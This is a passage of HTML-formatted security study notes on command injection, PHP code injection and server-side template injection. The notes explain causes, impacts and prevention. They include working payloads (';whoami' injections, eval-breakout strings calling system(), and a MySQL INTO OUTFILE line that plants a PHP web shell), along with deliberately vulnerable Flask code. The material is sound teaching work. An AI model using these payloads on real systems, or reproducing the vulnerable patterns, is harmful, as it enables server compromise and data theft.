                      <li style="margin-bottom: 5px;">Test headers like <code>User-Agent</code>, <code>Referer</code>,
                        or <code>X-Forwarded-For</code>, which may be logged or processed by the application in a way
                        that invokes system commands.</li>
                      <li style="margin-bottom: 5px;">Example: Inject <code>;whoami</code> into the
                        <code>User-Agent</code> header and monitor the response.</li>
                    </ul>
                  </li>
                  <li style="margin-bottom: 15px;"><strong>POST Data</strong>:
                    <ul style="padding-left: 20px; list-style-type: circle; margin-top: 5px;">
                      <li style="margin-bottom: 5px;">Test POST request parameters, such as those sent via forms or
                        APIs, for unsanitized input passed to system calls.</li>
                      <li style="margin-bottom: 5px;">Example: In a POST request to <code>http://example.com/doc</code>
                        with a parameter like <code>Doc=Doc1.pdf</code>, try <code>Doc=Doc1.pdf;whoami</code> to check
                        for command execution.</li>
                    </ul>
                  </li>
                  <li style="margin-bottom: 15px;"><strong>File Uploads</strong>:
                    <ul style="padding-left: 20px; list-style-type: circle; margin-top: 5px;">
                      <li style="margin-bottom: 5px;">Test file upload functionalities that allow arbitrary file
                        extensions, as uploaded files in the webroot could execute malicious commands.</li>
                      <li style="margin-bottom: 5px;">Example: Upload a file named <code>malicious.php;whoami</code> and
                        check if the server executes the injected command.</li>
                    </ul>
                  </li>
                  <li style="margin-bottom: 15px;"><strong>API Endpoints</strong>:
                    <ul style="padding-left: 20px; list-style-type: circle; margin-top: 5px;">
                      <li style="margin-bottom: 5px;">Test API endpoints that accept user input, especially those
                        interacting with system-level operations (e.g., network diagnostics or file processing).</li>
                      <li style="margin-bottom: 5px;">Example: An API endpoint like
                        <code>/api/ping?host=127.0.0.1</code> could be tested with <code>127.0.0.1;id</code>.</li>
                    </ul>
                  </li>
                  <li style="margin-bottom: 15px;"><strong>Hidden Fields and Cookies</strong>:
                    <ul style="padding-left: 20px; list-style-type: circle; margin-top: 5px;">
                      <li style="margin-bottom: 5px;">Test hidden form fields or cookies that may be processed by
                        backend scripts invoking system commands.</li>
                      <li style="margin-bottom: 5px;">Example: Modify a cookie value to include <code>;whoami</code> and
                        observe the serverÃ¢â‚¬â„¢s behavior.</li>
                    </ul>
                  </li>
                  <li style="margin-bottom: 15px;"><strong>Server-Side Templates</strong>:
                    <ul style="padding-left: 20px; list-style-type: circle; margin-top: 5px;">
                      <li style="margin-bottom: 5px;">Test applications using server-side templating (e.g., Twig,
                        Jinja2) for Server-Side Template Injection (SSTI), which can lead to command execution if user
                        input is unsafely embedded.</li>
                    </ul>
                  </li>
                </ol>

                <h2
                  style="font-size: 1.8rem; font-weight: 700; color: #2563eb; border-bottom: 2px solid #2563eb; padding-bottom: 10px; margin-top: 50px; margin-bottom: 20px;">
                  Practical example &rarr;</h2>

                <h3 style="font-size: 1.4rem; margin-top: 30px; color: var(--color-dark-varient, #4b5563);">(1) this web
                  app make ping, we enter the ip and get result</h3>
                <p style="font-size: 1.2rem; margin-bottom: 10px;">(2) try inject command after ip, dont forget put (
                  <code>;</code> ) semi colon</p>
                <code
                  style="display: block; background: #1e1e1e; color: #4ade80; padding: 20px; border-radius: 8px; font-family: monospace; font-size: 1.1rem; margin: 15px 0; overflow-x: auto;">127.0.0.1;whoami; 

--&gt; this work and give me result</code>

                <h3 style="font-size: 1.4rem; margin-top: 30px; color: var(--color-dark-varient, #4b5563);">2 &rarr; the
                  URL</h3>
                <code
                  style="display: block; background: #1e1e1e; color: #4ade80; padding: 20px; border-radius: 8px; font-family: monospace; font-size: 1.1rem; margin: 15px 0; overflow-x: auto;">https://insecure-website.com/stockStatus?productID=381&amp;storeID=29

if i inject &amp; whoami &amp;

https://insecure-website.com/stockStatus?productID=1&amp;whoami&amp;storeID=29</code>

                <h2
                  style="font-size: 1.8rem; font-weight: 700; color: #2563eb; border-bottom: 2px solid #2563eb; padding-bottom: 10px; margin-top: 50px; margin-bottom: 20px;">
                  Resources &rarr;</h2>
                <ul style="font-size: 1.2rem; padding-left: 30px; list-style-type: disc;">
                  <li style="margin-bottom: 10px;"><a
                      href="https://www.notion.so/Command-Injection-Cheatsheet-28227bcaaa9680d2af2dc7a2bb76b46f?pvs=21"
                      target="_blank" style="color: #2563eb; text-decoration: underline;">Command Injection
                      Cheatsheet</a></li>
                  <li style="margin-bottom: 10px;"><a
                      href="https://www.notion.so/Attacks-Filters-bypass-28227bcaaa96800c8689f4520854888a?pvs=21"
                      target="_blank" style="color: #2563eb; text-decoration: underline;">Attacks &amp;&amp; Filters
                      bypass</a></li>
                  <li style="margin-bottom: 10px;"><a
                      href="https://www.notion.so/Attacks-33427bcaaa96806c80d2d8716fe5973b?pvs=21" target="_blank"
                      style="color: #2563eb; text-decoration: underline;">Attacks</a></li>
                  <li style="margin-bottom: 10px;"><a
                      href="https://www.notion.so/Notes-25927bcaaa96801ab4d7c558dfe39461?pvs=21" target="_blank"
                      style="color: #2563eb; text-decoration: underline;">Notes</a></li>
                  <li style="margin-bottom: 10px;"><a
                      href="https://www.notion.so/Writeups-23827bcaaa96804f8b9fec209a125f3c?pvs=21" target="_blank"
                      style="color: #2563eb; text-decoration: underline;">Writeups</a></li>
                  <li style="margin-bottom: 10px;"><a
                      href="https://www.notion.so/Methodology-23827bcaaa96809f8218e273f1c86083?pvs=21" target="_blank"
                      style="color: #2563eb; text-decoration: underline;">Methodology</a></li>
                  <li style="margin-bottom: 10px;"><a
                      href="https://www.notion.so/vuln-code-23827bcaaa96807f97b2cb25349468e7?pvs=21" target="_blank"
                      style="color: #2563eb; text-decoration: underline;">Vuln code</a></li>
                  <li style="margin-bottom: 10px;"><a
                      href="https://www.notion.so/Tools-28227bcaaa9680da9858e7bb74484894?pvs=21" target="_blank"
                      style="color: #2563eb; text-decoration: underline;">Tools</a></li>
                </ul>

              </div>
            </div>
          </div>
        </article>

        <article class="section">
          <div class="section__title">
            <h2 class="section__title__text">
              Code Injection
            </h2>
            <span><i class="fa-solid fa-arrow-down" style="color: #7380ce; font-size: large;"></i></span>
          </div>

          <div class="section__text">
            <div
              style="width: 100%; margin: 0; padding: 0; background-color: var(--color-background, #ffffff); color: var(--color-dark, #1f2937); font-family: 'Segoe UI', Tahoma, sans-serif; line-height: 1.7; transition: all 0.3s ease;">
              <div style="padding: 40px 6%;">

                <p style="font-size: 1.2rem; margin-bottom: 20px;"><strong>&rarr; Security Vulnerability in web
                    application that allow attacker inject and execute code in app</strong></p>
                <p style="font-size: 1.2rem; margin-bottom: 20px;">&rarr; the code injection should be in the language
                  used by the application. Therefore, the first step in an injection is to find what language is used by
                  the application.</p>
                <ul style="font-size: 1.2rem; padding-left: 30px; list-style-type: disc;">
                  <li style="margin-bottom: 10px;">if you want to run the command <code>ls</code>, you will need to send
                    <code>system("ls")</code> to the application if it is a PHP application.</li>
                </ul>

                <h2
                  style="font-size: 1.8rem; font-weight: 700; color: #2563eb; border-bottom: 2px solid #2563eb; padding-bottom: 10px; margin-top: 50px; margin-bottom: 20px;">
                  &rarr; Primary Causes &rarr;</h2>

                <h3 style="font-size: 1.4rem; margin-top: 30px; color: var(--color-dark-varient, #4b5563);">1. Improper
                  Input Validation</h3>
                <ul style="font-size: 1.2rem; padding-left: 30px; list-style-type: disc;">
                  <li style="margin-bottom: 10px;">Failure to sanitize user-supplied input before processing</li>
                  <li style="margin-bottom: 10px;">Accepting unfiltered data from forms, URLs, cookies, or headers</li>
                </ul>

                <h3 style="font-size: 1.4rem; margin-top: 30px; color: var(--color-dark-varient, #4b5563);">2. Use of
                  Dangerous Functions</h3>
                <p style="font-size: 1.2rem; margin-bottom: 10px;">Functions that evaluate strings as PHP code:</p>
                <ul style="font-size: 1.2rem; padding-left: 30px; list-style-type: disc;">
                  <li style="margin-bottom: 10px;"><code>eval()</code> - Directly executes string input as PHP code</li>
                  <li style="margin-bottom: 10px;"><code>assert()</code> - Similar to eval but designed for debugging
                  </li>
                  <li style="margin-bottom: 10px;"><code>preg_replace()</code> with <code>/e</code> modifier (deprecated
                    in PHP 5.5, removed in PHP 7)</li>
                  <li style="margin-bottom: 10px;"><code>create_function()</code> - Creates anonymous functions from
                    strings</li>
                </ul>

                <h3 style="font-size: 1.4rem; margin-top: 30px; color: var(--color-dark-varient, #4b5563);">3. Dynamic
                  Code Execution</h3>
                <ul style="font-size: 1.2rem; padding-left: 30px; list-style-type: disc;">
                  <li style="margin-bottom: 10px;">Constructing code dynamically from user input without proper
                    sanitization</li>
                  <li style="margin-bottom: 10px;">Example: <code>$func = $_GET['function']; $func();</code></li>
                </ul>

                <h2
                  style="font-size: 1.8rem; font-weight: 700; color: #2563eb; border-bottom: 2px solid #2563eb; padding-bottom: 10px; margin-top: 50px; margin-bottom: 20px;">
                  &rarr; Impact of PHP Code Injection &rarr;</h2>
                <ol style="font-size: 1.2rem; padding-left: 30px;">
                  <li style="margin-bottom: 15px;"><strong>Complete Server Compromise</strong>
                    <ul style="padding-left: 20px; list-style-type: circle; margin-top: 5px;">
                      <li style="margin-bottom: 5px;">Attackers can execute arbitrary commands with web server
                        privileges</li>
                      <li style="margin-bottom: 5px;">May lead to full system takeover if the web server runs with
                        elevated privileges</li>
                    </ul>
                  </li>
                  <li style="margin-bottom: 15px;"><strong>Data Breaches</strong>
                    <ul style="padding-left: 20px; list-style-type: circle; margin-top: 5px;">
                      <li style="margin-bottom: 5px;">Access, modify, or delete sensitive data in databases</li>
                      <li style="margin-bottom: 5px;">Extract credentials and other confidential information</li>
                    </ul>
                  </li>
                  <li style="margin-bottom: 15px;"><strong>Website Defacement</strong>
                    <ul style="padding-left: 20px; list-style-type: circle; margin-top: 5px;">
                      <li style="margin-bottom: 5px;">Modify website content and functionality</li>
                      <li style="margin-bottom: 5px;">Inject malicious content visible to all users</li>
                    </ul>
                  </li>
                  <li style="margin-bottom: 15px;"><strong>Backdoor Installation</strong>
                    <ul style="padding-left: 20px; list-style-type: circle; margin-top: 5px;">
                      <li style="margin-bottom: 5px;">Create persistent access points for future attacks</li>
                      <li style="margin-bottom: 5px;">Upload web shells or other malicious tools</li>
                    </ul>
                  </li>
                  <li style="margin-bottom: 15px;"><strong>Server Resource Abuse</strong>
                    <ul style="padding-left: 20px; list-style-type: circle; margin-top: 5px;">
                      <li style="margin-bottom: 5px;">Use server resources for cryptocurrency mining</li>
                      <li style="margin-bottom: 5px;">Launch attacks against other systems (DDoS, spam, etc.)</li>
                    </ul>
                  </li>
                  <li style="margin-bottom: 15px;"><strong>Malware Distribution</strong>
                    <ul style="padding-left: 20px; list-style-type: circle; margin-top: 5px;">
                      <li style="margin-bottom: 5px;">Serve malicious JavaScript or exploit kits to visitors</li>
                      <li style="margin-bottom: 5px;">Infect users with malware through the compromised website</li>
                    </ul>
                  </li>
                  <li style="margin-bottom: 15px;"><strong>Pivoting to Internal Networks</strong>
                    <ul style="padding-left: 20px; list-style-type: circle; margin-top: 5px;">
                      <li style="margin-bottom: 5px;">If the server is on an internal network, attackers may gain access
                        to other systems</li>
                    </ul>
                  </li>
                </ol>

                <h2
                  style="font-size: 1.8rem; font-weight: 700; color: #2563eb; border-bottom: 2px solid #2563eb; padding-bottom: 10px; margin-top: 50px; margin-bottom: 20px;">
                  &rarr; Prevention Measures &rarr;</h2>
                <div
                  style="background-color: var(--color-white, #f3f4f6); padding: 25px; border-radius: 12px; border-left: 6px solid #2563eb; box-shadow: var(--box-shadow, 0 0.5rem 1rem rgba(0,0,0,0.05)); margin: 30px 0;">
                  <ul style="font-size: 1.2rem; padding-left: 20px; list-style-type: disc; margin: 0;">
                    <li style="margin-bottom: 10px;">Avoid using <code>eval()</code>, <code>assert()</code>, and similar
                      functions</li>
                    <li style="margin-bottom: 10px;">Implement strict input validation and output encoding</li>
                    <li style="margin-bottom: 10px;">Use whitelisting for all user-supplied input</li>
                    <li style="margin-bottom: 10px;">Keep PHP and all libraries updated</li>
                    <li style="margin-bottom: 10px;">Disable dangerous PHP functions in php.ini</li>
                    <li style="margin-bottom: 10px;">Implement proper file permissions</li>
                    <li style="margin-bottom: 10px;">Use prepared statements for database access</li>
                    <li style="margin-bottom: 10px;">Consider using code analysis tools to detect vulnerabilities</li>
                  </ul>
                </div>

                <h2
                  style="font-size: 1.8rem; font-weight: 700; color: #2563eb; border-bottom: 2px solid #2563eb; padding-bottom: 10px; margin-top: 50px; margin-bottom: 20px;">
                  &rarr; Identify Code Execution Vulnerability &rarr;</h2>

                <h3 style="font-size: 1.4rem; margin-top: 30px; color: var(--color-dark-varient, #4b5563);">0 &rarr;
                </h3>
                <ul style="font-size: 1.2rem; padding-left: 30px; list-style-type: disc;">
                  <li style="margin-bottom: 10px;">inject single quote or double quote and see the result of error</li>
                </ul>

                <h3 style="font-size: 1.4rem; margin-top: 30px; color: var(--color-dark-varient, #4b5563);">1 &rarr;
                </h3>
                <ul style="font-size: 1.2rem; padding-left: 30px; list-style-type: disc;">
                  <li style="margin-bottom: 10px;">By using comments and injecting <code>/*</code> random value
                    <code>/</code>.</li>
                  <li style="margin-bottom: 10px;">By injecting a simple concatenation <code>"."</code> (where
                    <code>"</code> are used to break the syntax and reform it correctly).</li>
                  <li style="margin-bottom: 10px;">By replacing the parameter you provided by a string concatenation,
                    for example <code>"."ha"."cker"."</code> instead of <code>hacker</code>.</li>
                </ul>

                <h3 style="font-size: 1.4rem; margin-top: 30px; color: var(--color-dark-varient, #4b5563);">2 &rarr; use
                  time-based detection &rarr;</h3>
                <ul style="font-size: 1.2rem; padding-left: 30px; list-style-type: disc;">
                  <li style="margin-bottom: 10px;">for this issue by using the PHP function <code>sleep</code>. You will
                    see a time difference between:
                    <ul style="padding-left: 20px; list-style-type: circle; margin-top: 5px;">
                      <li style="margin-bottom: 5px;">Not using the function <code>sleep</code> or calling it with a
                        delay of zero: <code>sleep(0)</code>.</li>
                      <li style="margin-bottom: 5px;">A call to the function with a long delay: <code>sleep(10)</code>.
                      </li>
                    </ul>
                  </li>
                </ul>

                <h2
                  style="font-size: 1.8rem; font-weight: 700; color: #2563eb; border-bottom: 2px solid #2563eb; padding-bottom: 10px; margin-top: 50px; margin-bottom: 20px;">
                  example &rarr;</h2>

                <h3 style="font-size: 1.4rem; margin-top: 30px; color: var(--color-dark-varient, #4b5563);">1 &rarr; if
                  i had root access or any user access to my sql DB .</h3>
                <p style="font-size: 1.2rem; margin-bottom: 10px;">&rarr; can type this command to execute commands</p>

                <code
                  style="display: block; background: #1e1e1e; color: #4ade80; padding: 20px; border-radius: 8px; font-family: monospace; font-size: 1.1rem; margin: 15px 0; overflow-x: auto;">mysql -u root -h &lt;server ip&gt;

show tables;

select '&lt;?php $output=shell_exec($_GET["cmd"]); echo "&lt;pre&gt; $output &lt;/pre&gt;"?&gt;' into outfile '/var/www/html/shell.php' from mysql.user limit 1;

then access -&gt; http://www.example.com/shell.php?cmd='id' </code>

                <div
                  style="background-color: var(--color-white, #f3f4f6); padding: 25px; border-radius: 12px; border-left: 6px solid #2563eb; box-shadow: var(--box-shadow, 0 0.5rem 1rem rgba(0,0,0,0.05)); margin: 30px 0; font-size: 1.2rem;">
                  <strong>&rarr; Malicious Input: Attackers craft input that includes PHP code snippets, often enclosed
                    within PHP tags (&lt;?php ... ?&gt;) or backticks (`).</strong>
                </div>

                <code
                  style="display: block; background: #1e1e1e; color: #4ade80; padding: 20px; border-radius: 8px; font-family: monospace; font-size: 1.1rem; margin: 15px 0; overflow-x: auto;">**http://www.example.com?msg=test;phpinfo();

-&gt; to execute OS commands -&gt;
http://www.example.com?msg=test;system('whoami');**</code>

                <ul style="font-size: 1.2rem; padding-left: 30px; list-style-type: disc;">
                  <li style="margin-bottom: 15px;"><strong>1 &rarr;</strong> If you inject a single quote, nothing
                    happens. However, you can get a better idea of the problem by injecting a double quote:</li>
                </ul>
                <code
                  style="display: block; background: #1e1e1e; color: #4ade80; padding: 20px; border-radius: 8px; font-family: monospace; font-size: 1.1rem; margin: 15px 0; overflow-x: auto;">Parse error: syntax error, unexpected '!', expecting ',' or ';' in /var/www/index.php(6) : eval()'d code on line 1</code>

                <ul style="font-size: 1.2rem; padding-left: 30px; list-style-type: disc;">
                  <li style="margin-bottom: 10px;"><strong>2 &rarr;</strong> app use php and eval</li>
                  <li style="margin-bottom: 10px;"><strong>3 &rarr;</strong> We saw that the double quote breaks the
                    syntax, and that the function <code>eval</code> seems to be using our input. From this, we can try
                    to work out payloads that will give us the same results &rarr;
                    <ul style="padding-left: 20px; list-style-type: circle; margin-top: 5px;">
                      <li style="margin-bottom: 5px;"><code>"."</code>: we are just adding a string concatenation; this
                        should give us the same value.</li>
                      <li style="margin-bottom: 5px;"><code>"./*pentesterlab*/"</code>: we are just adding a string
                        concatenation and information inside comments; this should give us the same value.</li>
                    </ul>
                  </li>
                  <li style="margin-bottom: 10px;"><strong>4 &rarr;</strong> The challenge here is to break out of the
                    code syntax and keep a clean syntax. There are many ways to do it &rarr;
                    <ul style="padding-left: 20px; list-style-type: circle; margin-top: 5px;">
                      <li style="margin-bottom: 5px;">By adding dummy code: <code>".system('uname -a');"</code>.</li>
                      <li style="margin-bottom: 5px;">By using comment: <code>".system('uname -a');#</code> or
                        <code>".system('uname -a');//</code>.</li>
                    </ul>
                  </li>
                </ul>

                <h2
                  style="font-size: 1.8rem; font-weight: 700; color: #2563eb; border-bottom: 2px solid #2563eb; padding-bottom: 10px; margin-top: 50px; margin-bottom: 20px;">
                  Resources &rarr;</h2>
                <ul style="font-size: 1.2rem; padding-left: 30px; list-style-type: disc;">
                  <li style="margin-bottom: 10px;"><a
                      href="https://www.notion.so/Writeups-2da27bcaaa96802bb8c6d891a47a8f7e?pvs=21" target="_blank"
                      style="color: #2563eb; text-decoration: underline;">Writeups</a></li>
                  <li style="margin-bottom: 10px;"><a
                      href="https://www.notion.so/Notes-2da27bcaaa96802a8d9bd9de83929622?pvs=21" target="_blank"
                      style="color: #2563eb; text-decoration: underline;">Notes</a></li>
                </ul>

              </div>
            </div>
          </div>
        </article>

        <article class="section">
          <div class="section__title">
            <h2 class="section__title__text">
              Server-Side Template Injection &lt; SSTI &gt;
            </h2>
            <span><i class="fa-solid fa-arrow-down" style="color: #7380ce; font-size: large;"></i></span>
          </div>

          <div class="section__text">
            <div style="width: 100%; margin: 0; padding: 0; background-color: var(--color-background, #ffffff); color: var(--color-dark, #1f2937); font-family: 'Segoe UI', Tahoma, sans-serif; line-height: 1.7; transition: all 0.3s ease;">
              <div style="padding: 40px 6%;">

                <h2 style="font-size: 1.8rem; font-weight: 700; color: #2563eb; border-bottom: 2px solid #2563eb; padding-bottom: 10px; margin-top: 50px; margin-bottom: 20px;">&rarr; What is Template ? &rarr;</h2>
                <p style="font-size: 1.2rem; margin-bottom: 20px;">&rarr; Predesigned file that defines the <strong>structure and layout</strong> of page but allows <strong>dynamic content insertion</strong> using placeholders .</p>
                <ul style="font-size: 1.2rem; padding-left: 30px; list-style-type: disc;">
                  <li style="margin-bottom: 10px;"><strong>Static part</strong>: Fixed HTML structure.</li>
                  <li style="margin-bottom: 10px;"><strong>Dynamic part</strong>: <code>{{ username }}</code> and <code>{{ last_login }}</code> are replaced with actual data at runtime.</li>
                </ul>
                <code style="display: block; background: #1e1e1e; color: #4ade80; padding: 20px; border-radius: 8px; font-family: monospace; font-size: 1.1rem; margin: 15px 0; overflow-x: auto;">&lt;html&gt;
  &lt;body&gt;
    &lt;h1&gt;Welcome, {{ username }}!&lt;/h1&gt;  &lt;!-- Dynamic part --&gt;
    &lt;p&gt;Your last login was on {{ last_login }}.&lt;/p&gt;
  &lt;/body&gt;
&lt;/html&gt;</code>

                <h2 style="font-size: 1.8rem; font-weight: 700; color: #2563eb; border-bottom: 2px solid #2563eb; padding-bottom: 10px; margin-top: 50px; margin-bottom: 20px;">&rarr; What is Template Engine ? &rarr;</h2>
                <p style="font-size: 1.2rem; margin-bottom: 20px;">&rarr; Software Component that process template by :&rarr;</p>
                <ol style="font-size: 1.2rem; padding-left: 30px;">
                  <li style="margin-bottom: 15px;"><strong>Replacing placeholders</strong> with actual data.</li>
                  <li style="margin-bottom: 15px;"><strong>Executing logic</strong> (like loops, conditionals) inside templates.</li>
                  <li style="margin-bottom: 15px;"><strong>Generating the final output</strong> (e.g., HTML, JSON, or plain text).</li>
                </ol>
                <div style="background-color: var(--color-white, #f3f4f6); padding: 25px; border-radius: 12px; border-left: 6px solid #2563eb; box-shadow: var(--box-shadow, 0 0.5rem 1rem rgba(0,0,0,0.05)); margin: 30px 0; font-size: 1.2rem; font-style: italic;">
                  <strong>&rarr; Template engines are designed to generate web pages by combining fixed templates with dynamic data.</strong>
                </div>
                <ul style="font-size: 1.2rem; padding-left: 30px; list-style-type: disc;">
                  <li style="margin-bottom: 10px;">&rarr; software that combines pre-defined templates with dynamically generated data and is often used by web applications to generate dynamic responses.</li>
                  <li style="margin-bottom: 10px;">modern template engines support more complex operations typically provided by programming languages, such as conditions and loops.</li>
                </ul>
                <p style="font-size: 1.2rem; margin-bottom: 20px;"><strong>&rarr; Different template engines have distinct syntaxes and feature</strong></p>

                <h3 style="font-size: 1.4rem; margin-top: 30px; color: var(--color-dark-varient, #4b5563);">Popular Template Engines</h3>
                <div style="overflow-x: auto; margin: 20px 0;">
                  <table style="width: 100%; border-collapse: collapse; font-size: 1.2rem; text-align: left;">
                    <thead>
                      <tr style="background-color: var(--color-white, #f3f4f6); border-bottom: 2px solid #e5e7eb;">
                        <th style="padding: 12px 15px;">Language</th>
                        <th style="padding: 12px 15px;">Template Engine(s)</th>
                        <th style="padding: 12px 15px;">Example Syntax</th>
                      </tr>
                    </thead>
                    <tbody>
                      <tr style="border-bottom: 1px solid #e5e7eb;">
                        <td style="padding: 12px 15px;">Python</td>
                        <td style="padding: 12px 15px;">Jinja2, Mako, Django</td>
                        <td style="padding: 12px 15px;"><code>{{ variable }}</code></td>
                      </tr>
                      <tr style="border-bottom: 1px solid #e5e7eb;">
                        <td style="padding: 12px 15px;">Ruby</td>
                        <td style="padding: 12px 15px;">ERB, Slim, Haml</td>
                        <td style="padding: 12px 15px;"><code>&lt;%= variable %&gt;</code></td>
                      </tr>
                      <tr style="border-bottom: 1px solid #e5e7eb;">
                        <td style="padding: 12px 15px;">Java</td>
                        <td style="padding: 12px 15px;">FreeMarker, Thymeleaf</td>
                        <td style="padding: 12px 15px;"><code>${variable}</code></td>
                      </tr>
                      <tr style="border-bottom: 1px solid #e5e7eb;">
                        <td style="padding: 12px 15px;">JavaScript</td>
                        <td style="padding: 12px 15px;">EJS, Pug, Handlebars, jade</td>
                        <td style="padding: 12px 15px;"><code>&lt;%= variable %&gt;</code></td>
                      </tr>
                      <tr style="border-bottom: 1px solid #e5e7eb;">
                        <td style="padding: 12px 15px;">PHP</td>
                        <td style="padding: 12px 15px;">Twig, Blade, Smarty</td>
                        <td style="padding: 12px 15px;"><code>{{ variable }}</code></td>
                      </tr>
                    </tbody>
                  </table>
                </div>

                <h2 style="font-size: 1.8rem; font-weight: 700; color: #2563eb; border-bottom: 2px solid #2563eb; padding-bottom: 10px; margin-top: 50px; margin-bottom: 20px;">&rarr; What is Server-Side Template Injection ( SSTI ) ? &rarr;</h2>
                <ol style="font-size: 1.2rem; padding-left: 30px;">
                  <li style="margin-bottom: 15px;"><strong>User input is dynamically embedded into a server-side template</strong> (e.g., Jinja2, Twig, ERB).</li>
                  <li style="margin-bottom: 15px;"><strong>The template engine executes malicious input as code</strong> (not just as plain text).</li>
                  <li style="margin-bottom: 15px;"><strong>This allows attackers to execute arbitrary commands</strong> (RCE), access sensitive data, or manipulate server logic.</li>
                </ol>
                <ul style="font-size: 1.2rem; padding-left: 30px; list-style-type: disc;">
                  <li style="margin-bottom: 10px;">occurs when an attacker can inject templating code into a template that is later rendered by the server. If an attacker injects malicious code, the server potentially executes the code during the rendering process, enabling an attacker to take over the server completely.</li>
                </ul>
                <div style="background-color: var(--color-white, #f3f4f6); padding: 25px; border-radius: 12px; border-left: 6px solid #eab308; box-shadow: var(--box-shadow, 0 0.5rem 1rem rgba(0,0,0,0.05)); margin: 30px 0; font-size: 1.2rem; font-style: italic;">
                  <strong>&rarr; security vulnerability where an attacker injects malicious template code into a web application that uses a server-side template engine. If the application unsafely embeds user input into templates, the injected code is executed on the server, potentially leading to&rarr;</strong>
                  <ul style="padding-left: 20px; list-style-type: circle; margin-top: 10px;">
                    <li><strong>Remote Code Execution (RCE)</strong></li>
                    <li><strong>Data leakage</strong></li>
                    <li><strong>Server compromise</strong></li>
                    <li><strong>Authentication bypass</strong></li>
                  </ul>
                </div>

                <h3 style="font-size: 1.4rem; margin-top: 30px; color: var(--color-dark-varient, #4b5563);">Example &mdash; vulnerable Flask code &rarr;</h3>
                <code style="display: block; background: #1e1e1e; color: #4ade80; padding: 20px; border-radius: 8px; font-family: monospace; font-size: 1.1rem; margin: 15px 0; overflow-x: auto;">from flask import request, render_template_string

@app.route("/hello")
def hello():
    name = request.args.get("name")
    return render_template_string(f"Hello {name}")</code>
                <ul style="font-size: 1.2rem; padding-left: 30px; list-style-type: disc;">
                  <li style="margin-bottom: 10px;">If a user visits:</li>
                </ul>
                <code style="display: block; background: #1e1e1e; color: #4ade80; padding: 20px; border-radius: 8px; font-family: monospace; font-size: 1.1rem; margin: 15px 0; overflow-x: auto;">/hello?name={{7*7}}</code>
                <ul style="font-size: 1.2rem; padding-left: 30px; list-style-type: disc;">
                  <li style="margin-bottom: 10px;">The server will evaluate <code>{{7*7}}</code> inside the template, returning:</li>
                </ul>
                <code style="display: block; background: #1e1e1e; color: #4ade80; padding: 20px; border-radius: 8px; font-family: monospace; font-size: 1.1rem; margin: 15px 0; overflow-x: auto;">Hello 49</code>

                <p style="font-size: 1.2rem; margin-bottom: 20px;">
                  <a href="https://www.notion.so/SSTI-Cheatsheet-29127bcaaa9680a9af18c4bc73bbe8a9?pvs=21" target="_blank" style="color: #2563eb; text-decoration: underline; font-weight: bold;">SSTI Cheatsheet</a>
                </p>

                <h2 style="font-size: 1.8rem; font-weight: 700; color: #2563eb; border-bottom: 2px solid #2563eb; padding-bottom: 10px; margin-top: 50px; margin-bottom: 20px;">&rarr; Why SSTI happen ? &lt; causes &gt; &rarr;</h2>
                <ol style="font-size: 1.2rem; padding-left: 30px;">
                  <li style="margin-bottom: 15px;">Developers directly embed user input into templates <strong>without sanitization</strong>.</li>
                  <li style="margin-bottom: 15px;">Template engines allow <strong>dangerous functions</strong> (e.g., <code>os.system</code>, file access).</li>
                  <li style="margin-bottom: 15px;">misconfigured Template engines
                    <ul style="padding-left: 20px; list-style-type: circle; margin-top: 5px;">
                      <li>&rarr; Engines like <strong>Twig (PHP)</strong> or <strong>FreeMarker (Java)</strong> allow unsafe features by default.</li>
                    </ul>
                  </li>
                </ol>

                <h2 style="font-size: 1.8rem; font-weight: 700; color: #2563eb; border-bottom: 2px solid #2563eb; padding-bottom: 10px; margin-top: 50px; margin-bottom: 20px;">&rarr; Impact of SSTI &rarr;</h2>

                <h3 style="font-size: 1.4rem; margin-top: 30px; color: var(--color-dark-varient, #4b5563);">1- Remote Code Execution (RCE) &lt; critical &gt;</h3>
                <p style="font-size: 1.2rem; margin-bottom: 10px;"><strong>What Happens?</strong></p>
                <ul style="font-size: 1.2rem; padding-left: 30px; list-style-type: disc;">
                  <li style="margin-bottom: 10px;">Attackers execute <strong>arbitrary system commands</strong> on the server.</li>
                  <li style="margin-bottom: 10px;">Full server compromise (e.g., <code>cat /etc/passwd</code>, <code>rm -rf /</code>).</li>
                </ul>

                <h3 style="font-size: 1.4rem; margin-top: 30px; color: var(--color-dark-varient, #4b5563);">Access To Sensitive files</h3>
                <p style="font-size: 1.2rem; margin-bottom: 10px;"><strong>What Happens?</strong></p>
                <ul style="font-size: 1.2rem; padding-left: 30px; list-style-type: disc;">
                  <li style="margin-bottom: 10px;">Read or modify <strong>server files</strong> (<code>/etc/passwd</code>, <code>.env</code>, database credentials).</li>
                  <li style="margin-bottom: 10px;">Access <strong>application secrets</strong> (API keys, admin passwords).</li>
                </ul>

                <h3 style="font-size: 1.4rem; margin-top: 30px; color: var(--color-dark-varient, #4b5563);">Access sensitive information</h3>
                <ul style="font-size: 1.2rem; padding-left: 30px; list-style-type: disc;">
                  <li style="margin-bottom: 10px;">environment variables, database credentials)</li>
                </ul>

                <h3 style="font-size: 1.4rem; margin-top: 30px; color: var(--color-dark-varient, #4b5563);">Authentication Bypass</h3>
                <p style="font-size: 1.2rem; margin-bottom: 10px;"><strong>What Happens?</strong></p>
                <ul style="font-size: 1.2rem; padding-left: 30px; list-style-type: disc;">
                  <li style="margin-bottom: 10px;">Modify <strong>template logic</strong> to bypass login checks.</li>
                  <li style="margin-bottom: 10px;">Example: Override <code>user.is_admin</code> to <code>True</code>.</li>
                </ul>

                <h3 style="font-size: 1.4rem; margin-top: 30px; color: var(--color-dark-varient, #4b5563);">Denial of Service (DoS)</h3>
                <p style="font-size: 1.2rem; margin-bottom: 10px;"><strong>What Happens?</strong></p>
                <ul style="font-size: 1.2rem; padding-left: 30px; list-style-type: disc;">
                  <li style="margin-bottom: 10px;">Crash the server with <strong>infinite loops</strong> or <strong>resource exhaustion</strong>.</li>
                </ul>

                <h2 style="font-size: 1.8rem; font-weight: 700; color: #2563eb; border-bottom: 2px solid #2563eb; padding-bottom: 10px; margin-top: 50px; margin-bottom: 20px;">&rarr; Prevention Techniques (Secure Coding) &rarr;</h2>

                <h3 style="font-size: 1.4rem; margin-top: 30px; color: var(--color-dark-varient, #4b5563);">1. Avoid Dynamic Template Rendering &rarr;</h3>
                <p style="font-size: 1.2rem; margin-bottom: 10px;">Ã¢ÂÅ’ <strong>Vulnerable (Flask/Jinja2 - UNSAFE):</strong></p>
                <code style="display: block; background: #1e1e1e; color: #4ade80; padding: 20px; border-radius: 8px; font-family: monospace; font-size: 1.1rem; margin: 15px 0; overflow-x: auto;"># Danger: Directly embeds user input in a template
